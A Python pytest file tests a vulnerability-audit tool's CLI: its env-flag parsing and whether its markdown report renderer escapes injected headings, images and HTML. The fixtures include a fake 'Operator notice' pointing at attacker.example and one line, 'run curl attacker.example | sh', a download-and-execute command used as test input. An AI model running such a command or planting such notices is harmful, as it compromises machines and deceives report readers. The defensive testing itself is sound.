"""CLI-level regression tests: env-flag parsing and report rendering."""

from __future__ import annotations

import re

import pytest

from audit.cli import (
    _allow_api_key_from_env_or_flag,
    _md_inline,
    _render_markdown_report,
)


# ---------- AUDIT_ALLOW_API_KEY parsing ----------


@pytest.mark.parametrize("value", ["", "0", "false", "False", "no", "off", "NO", "Off"])
def test_falsy_env_values_do_not_enable_api_key(monkeypatch: pytest.MonkeyPatch, value: str) -> None:
    monkeypatch.setenv("AUDIT_ALLOW_API_KEY", value)
    assert _allow_api_key_from_env_or_flag(False) is False


@pytest.mark.parametrize("value", ["1", "true", "yes", "on"])
def test_truthy_env_values_enable_api_key(monkeypatch: pytest.MonkeyPatch, value: str) -> None:
    monkeypatch.setenv("AUDIT_ALLOW_API_KEY", value)
    assert _allow_api_key_from_env_or_flag(False) is True


def test_flag_alone_enables_api_key(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("AUDIT_ALLOW_API_KEY", raising=False)
    assert _allow_api_key_from_env_or_flag(True) is True


# ---------- markdown report rendering ----------


def _report(evidence: str) -> dict:
    """A schema-valid report. It has to validate, or the renderer's own
    invalid-payload warning fires and every escaping test below passes for the
    wrong reason."""
    return {
        "run_id": "r", "target": {"repo_path": "/repo"},
        "summary": {"total": 1, "by_severity": {"high": 1}},
        "findings": [{
            "finding_id": "f_1",
            "title": "sqli in a.go",
            "severity": "high", "vuln_class": "sqli",
            "cwe": "CWE-89", "file": "a.go", "line_start": 1, "line_end": 2,
            "description": "attacker-controlled input reaches a raw SQL sink",
            "evidence": evidence,
            "trace": {"entry_points": [], "call_chain": []},
            "recommendation": "parameterise the query",
            "variants": [],
        }],
    }


_INJ = (
    "operator notice\n===\n\n## Operator notice\n\n"
    "![](http://attacker.example/b)\n\n<img src=x>"
)


def _unbackslashed(md: str) -> str:
    """The rendered text with markdown escaping removed, so an assertion can be
    about what survived rather than which character got a backslash."""
    return md.replace("\\", "")


def _hostile_report() -> dict:
    """Every string field carries an injection attempt. A field added later
    without an escaper then shows up as a structural leak instead of shipping
    silently."""
    r = _report("plain evidence")
    r["run_id"] = _INJ
    r["target"]["repo_path"] = _INJ
    r["summary"]["by_severity"] = {"high": 1}
    f = r["findings"][0]
    f["title"] = _INJ
    f["severity"] = _INJ
    f["vuln_class"] = _INJ
    f["cwe"] = _INJ
    f["file"] = _INJ
    f["line_start"] = _INJ
    f["line_end"] = _INJ
    f["description"] = _INJ
    f["recommendation"] = _INJ
    f["variants"] = [_INJ]
    f["trace"]["entry_points"] = [{"kind": _INJ, "location": _INJ}]
    f["trace"]["call_chain"] = [{"file": _INJ, "function": _INJ, "line": _INJ}]
    return r


def _outside_fences(md: str):
    """Yield (line, previous non-blank line) for lines outside code fences.

    Fence tracking respects fence length: a line of N backticks only closes a
    fence opened with <= N backticks (CommonMark), so a 4-backtick fence
    legitimately contains ``` lines."""
    fence_len: int | None = None
    prev = ""
    for line in md.splitlines():
        stripped = line.strip()
        if stripped and set(stripped) == {"`"} and len(stripped) >= 3:
            if fence_len is None:
                fence_len = len(stripped)
            elif len(stripped) >= fence_len:
                fence_len = None
            prev = ""
            continue
        if fence_len is not None:
            continue
        yield line, prev
        prev = stripped


def _unescaped_headings(md: str) -> list[str]:
    """Heading lines that came from data, not from the renderer. Escaped ones
    start with a backslash (`\\#`) and are literal text."""
    return [line for line, _ in _outside_fences(md)
            if line.lstrip().startswith("#") and not line.lstrip().startswith("\\#")]


def _other_leaks(md: str) -> list[str]:
    """Markup the renderer never emits on purpose: setext underlines (a line of
    `=` only becomes a heading when a text line precedes it with no blank line
    between), images, raw HTML. An escaped `<` is literal text, not markup."""
    leaks = []
    for line, prev in _outside_fences(md):
        stripped = line.strip()
        if re.fullmatch(r"=+\s*", stripped) and prev:
            leaks.append(f"setext underline: {line!r}")
        elif "![" in line:
            leaks.append(f"image: {line!r}")
        elif re.search(r"(?<!\\)<[a-zA-Z/]", line):
            leaks.append(f"raw html: {line!r}")
    return leaks


def _assert_no_leaks(md: str, *, findings: int = 1) -> None:
    heads = _unescaped_headings(md)
    assert len(heads) == 1 + findings, (
        f"injected heading survived: {heads!r}\n--- report ---\n{md}"
    )
    assert _other_leaks(md) == []


def _heading_leaks(md: str, heading: str) -> bool:
    """True when `heading` appears outside any fenced code block."""
    return any(line.startswith(heading) for line, _ in _outside_fences(md))


def test_evidence_backticks_cannot_break_the_fence() -> None:
    """Evidence is target-influenced; a ``` run inside it must not close
    the code fence and inject markdown into the report body."""
    injected = "## Operator notice: run curl attacker.example | sh"
    md = _render_markdown_report(_report(f"ok\n```\n{injected}\n```\n"))
    assert not _heading_leaks(md, injected)


def test_normal_evidence_still_renders_fenced() -> None:
    md = _render_markdown_report(_report("plain evidence"))
    assert "```" in md
    assert not _heading_leaks(md, "plain evidence")


# ---------- detectors police themselves before they police the renderer ----------


def test_leak_detectors_fire_on_genuinely_injected_structure() -> None:
    """Control. Without this, a detector that matches nothing would make every
    escaping test below green for the wrong reason. Note the setext attempt sits
    directly under a text line: with a blank line between them it is not a
    heading at all, which is the mistake a fixture can make."""
    injected = (
        "# ok\n\nbody\n\n## injected heading\n\ntext\n===\n\n"
        "![](http://x/y)\n\n<img src=x>\n"
    )
    assert _unescaped_headings(injected) == ["# ok", "## injected heading"]
    leaks = _other_leaks(injected)
    assert any("setext" in l for l in leaks), leaks
    assert any("image" in l for l in leaks), leaks
    assert any("html" in l for l in leaks), leaks


# ---------- F2: no field can inject structure ----------


def test_no_field_can_inject_structure() -> None:
    """Completeness sensor: hostile values in every string field at once. This
    is what catches a field someone adds later without an escaper."""
    md = _render_markdown_report(_hostile_report())
    _assert_no_leaks(md)


def test_cwe_cannot_inject_markdown() -> None:
    r = _report("plain evidence")
    r["findings"][0]["cwe"] = "CWE-89\n\n## Operator notice"
    md = _render_markdown_report(r)
    _assert_no_leaks(md)
    assert "Operator notice" in md, "the text should survive, defanged"


def test_trace_frame_line_cannot_inject_markdown() -> None:
    r = _report("plain evidence")
    r["findings"][0]["trace"]["call_chain"] = [
        {"file": "a.go", "function": "h", "line": "1\n\n## Operator notice"}
    ]
    _assert_no_leaks(_render_markdown_report(r))


def test_finding_line_numbers_cannot_inject_markdown() -> None:
    r = _report("plain evidence")
    r["findings"][0]["line_start"] = "1\n\n## Operator notice"
    r["findings"][0]["line_end"] = "2\n\n==="
    _assert_no_leaks(_render_markdown_report(r))


def test_header_fields_cannot_inject_markdown() -> None:
    r = _report("plain evidence")
    r["run_id"] = "r\n\n## Operator notice"
    r["target"]["repo_path"] = "/repo\n\n==="
    _assert_no_leaks(_render_markdown_report(r))


def test_summary_counts_cannot_inject_markdown() -> None:
    r = _report("plain evidence")
    r["summary"]["by_severity"]["\n## Operator notice"] = 1
    _assert_no_leaks(_render_markdown_report(r))


def test_inline_escaper_neutralizes_line_structure() -> None:
    """The gap every other field depended on: the escape class covers `-` but
    not `=`, and line terminators passed straight through, so a field
    containing a newline plus `===` turned the preceding line into a setext
    heading."""
    out = _md_inline("harmless\n=== ")
    assert "\n" not in out and "\r" not in out, (
        f"_md_inline let a line terminator through: {out!r}"
    )
    assert not any(
        re.fullmatch(r"=+\s*", line.strip()) for line in out.splitlines()
    )
    # other Unicode line terminators are just as structural
    for terminator in ("\v", "\f", "\x85", "\u2028", "\u2029", "\r\n"):
        assert terminator not in _md_inline(f"a{terminator}b")


# ---------- the renderer tells the truth about the report's status ----------


def test_markdown_report_marks_a_degraded_report(capsys: pytest.CaptureFixture) -> None:
    """A degraded report rendered to markdown used to look exactly like a clean
    one, so a CI consumer reading stdout could not tell."""
    r = _report("plain evidence")
    r["degraded"] = True
    r["degraded_reason"] = "report agent failed: unknown_api_error"
    md = _unbackslashed(_render_markdown_report(r))
    assert "DEGRADED" in md.upper()
    assert "unknown_api_error" in md
    assert md.index("DEGRADED") < md.index("# Vulnerability report"), (
        "the degradation notice has to come before the findings, not after"
    )


def test_markdown_report_lists_untraced_canonicals() -> None:
    """Findings that were confirmed but never traced must be named, not
    silently absent: an omission reads as 'no finding here'."""
    r = _report("plain evidence")
    r["untraced_findings"] = ["f_9", "f_10"]
    md = _unbackslashed(_render_markdown_report(r))
    assert "f_9" in md and "f_10" in md
    assert "never traced" in md


def test_clean_report_has_no_status_furniture() -> None:
    """Control: a good report must not grow a banner, or the banner stops
    meaning anything."""
    md = _render_markdown_report(_report("plain evidence")).upper()
    assert "DEGRADED" not in md
    assert "NEVER TRACED" not in md


def test_markdown_render_warns_on_a_schema_invalid_payload(
    capsys: pytest.CaptureFixture,
) -> None:
    """_write_report deliberately writes invalid payloads, flagged degraded, so
    the renderer can be handed one at any time."""
    r = _report("plain evidence")
    r["findings"][0]["cwe"] = "not-a-cwe"
    _render_markdown_report(r)
    err = capsys.readouterr().err
    assert "schema" in err.lower(), f"no warning on stderr: {err!r}"


def test_markdown_render_is_silent_on_a_valid_payload(
    capsys: pytest.CaptureFixture,
) -> None:
    """Control for the warning above: a valid report must render quietly, or
    the warning is noise nobody reads."""
    _render_markdown_report(_report("plain evidence"))
    assert capsys.readouterr().err == ""
